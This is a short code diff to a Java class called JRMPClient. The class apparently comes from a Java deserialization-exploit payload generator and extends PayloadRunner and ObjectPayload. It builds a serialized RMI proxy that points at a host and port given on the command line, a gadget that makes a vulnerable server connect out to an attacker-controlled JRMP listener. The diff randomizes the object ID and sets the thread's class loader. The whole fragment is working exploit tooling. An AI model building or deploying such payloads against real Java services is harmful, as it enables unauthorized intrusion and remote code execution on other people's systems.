@@ -64,7 +64,7 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
             host = command.substring(0, sep);
             port = Integer.valueOf(command.substring(sep + 1));
         }
-        ObjID id = new ObjID(0); // RMI registry
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
@@ -76,6 +76,7 @@ public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry>
 
 
     public static void main ( final String[] args ) throws Exception {
+        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
         PayloadRunner.run(JRMPClient.class, args);
     }
 }
